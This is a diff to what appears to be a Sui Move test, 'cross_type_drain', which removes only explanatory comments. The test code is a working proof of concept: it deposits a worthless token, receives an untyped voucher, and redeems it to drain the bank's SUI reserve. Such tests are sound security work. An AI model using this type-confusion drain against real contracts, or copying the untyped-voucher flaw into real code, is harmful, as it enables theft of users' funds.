@@ -14,17 +14,14 @@ fun cross_type_drain() {
     let mut sc = ts::begin(attacker);
 
     let mut bank = bank::create(ts::ctx(&mut sc));
-    // the bank's valuable reserve
     bank::fund<SUI>(&mut bank, coin::mint_for_testing<SUI>(1_000_000, ts::ctx(&mut sc)));
 
-    // deposit 1,000,000 units of a worthless token -> Voucher { value: 1_000_000 }
     let voucher = bank::deposit<CHEAP>(
         &mut bank,
         coin::mint_for_testing<CHEAP>(1_000_000, ts::ctx(&mut sc)),
         ts::ctx(&mut sc),
     );
 
-    // the voucher carries no type: redeem it against SUI instead
     let loot = bank::withdraw<SUI>(&mut bank, voucher, ts::ctx(&mut sc));
     assert!(coin::value(&loot) == 1_000_000, 0);
     assert!(bank::balance_of<SUI>(&bank) == 0, 1);
